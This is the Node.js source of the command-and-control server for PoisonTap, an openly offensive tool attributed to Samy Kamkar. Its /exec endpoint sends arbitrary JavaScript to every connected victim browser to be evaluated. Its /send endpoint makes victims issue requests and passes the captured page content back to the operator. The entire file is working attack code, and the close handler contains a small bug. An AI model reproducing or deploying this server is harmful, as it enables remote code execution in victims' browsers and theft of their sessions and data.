// PoisonTap by Samy Kamkar - https://samy.pl/poisontap

//var _ = require('underscore')
var WebSocketServer = require('websocket').server
var webSocketsServerPort = 1337
var http = require('http')
var conns = []
var gr
var server = http.createServer((request, response) => {
  console.log((new Date()) + ' HTTP server. URL ' + request.url + ' requested.')

  if (request.url.indexOf('/exec?') === 0)
  {
    response.writeHead(404, {'Content-Type': 'text/html'})
    for (var i in conns)
      conns[i].sendUTF(JSON.stringify({ request: 'eval', content: request.url.substr(6) }))
    response.end("sent")
  }
  else if (request.url.indexOf('/send?') === 0)
  {
    response.writeHead(404, {'Content-Type': 'text/html'})
    for (var i in conns)
      conns[i].sendUTF('{"' + decodeURI(request.url.substr(6)).replace(/"/g, '\\"').replace(/&/g, '","').replace(/=/g,'":"') + '"}')
    var checkgr = () =>
    {
      if (gr)
      {
        response.end(gr)
        gr = ""
      }
      else
        setTimeout(checkgr, 500)
    }
    checkgr()
  }
  else if (request.url === '/status')
  {
    response.writeHead(200, {'Content-Type': 'application/json'})
    var responseObject = {
      currentClients: 1234,
      totalHistory: 567
    }
    response.end(JSON.stringify(responseObject))
  }
  else {
    response.writeHead(404, {'Content-Type': 'text/html'})
    response.end('Sorry, unknown url')
  }
})
server.listen(webSocketsServerPort, () => {
  console.log((new Date()) + " Server is listening on port " + webSocketsServerPort)
})

// create the server
wsServer = new WebSocketServer({
  httpServer: server
})

function handleReq(obj, con)
{
  if (obj.request === 'getresponse')
    gr = obj.html
}

wsServer.on('request', (request) => {
  var obj
  var connection = request.accept(null, request.origin)
  conns.push(connection)

  connection.on('request', (message) => {
    console.log('request: ' + message)
  })

  connection.on('message', (message) => {
    try { obj = JSON.parse(message.utf8Data) } catch(e) { }
    console.log('message: ' + message.utf8Data)
    console.log(obj)

    if (typeof(obj) === 'object')
      handleReq(obj, connection)
    else
      connection.sendUTF('hello')
  })

  // remove connection from our list
  connection.on('close', connection => {
    console.log('connection closed')
    for (var i in conns)
      if (conns[i] == connection)
      //if (_.isEqual(conns[i], connection)) // XXX
        conn.splice(i, 1)
  })
})
